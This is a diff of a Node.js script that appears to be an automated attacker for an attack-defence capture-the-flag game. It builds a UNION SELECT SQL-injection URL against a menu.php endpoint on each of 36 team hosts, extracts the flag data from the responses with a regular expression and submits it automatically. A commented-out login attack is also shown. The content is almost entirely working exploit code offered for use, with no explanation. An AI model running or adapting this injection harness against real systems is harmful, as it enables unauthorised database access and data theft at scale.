@@ -34,16 +34,14 @@ var genInjectionCode = function (team) {
     return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
 }
 // regex for flag scrawling
-var regexPMCNameFlag = /\>(\d) (\w*)\<\/div\>/;
+var regexPMCNameFlag = /\>\d* (\w*)\<\/div\>/;
 
 var attackPMC = function (team) {
-    // console.log('ATTACKING: '.green + genInjectionCode(team));
     var req = http.request(genInjectionCode(team), function (res) {
         res.setEncoding('utf8');
-        res.on('data', function (chunk) {
-            match = chunk.toString().match(regexPMCNameFlag);
-            if (match) {
-                var flag = match[2];
+        res.on('data', function (data) {
+            flag = parseFlag(regexPMCNameFlag, data)
+            if (parseFlag(regexPMCNameFlag, data)) {
                 console.log('FLAG: '.yellow, team, flag);
                 submit(flag);
             }
@@ -60,7 +58,6 @@ var attackPMC = function (team) {
 //
 //  SSP Login Attack
 //
-
 
 var regexSSPLoginFlag = /Exit\n#(\w+)/
 var attackSSP = function (team) {
@@ -90,7 +87,7 @@ var attackAll = function () {
     console.log('====== START ATTACKING ====='.red);
     for (i = 0; i < 36; i++) {
         attackPMC(i);
-        attackSSP(i);
+        // attackSSP(i);
     }
 };
 
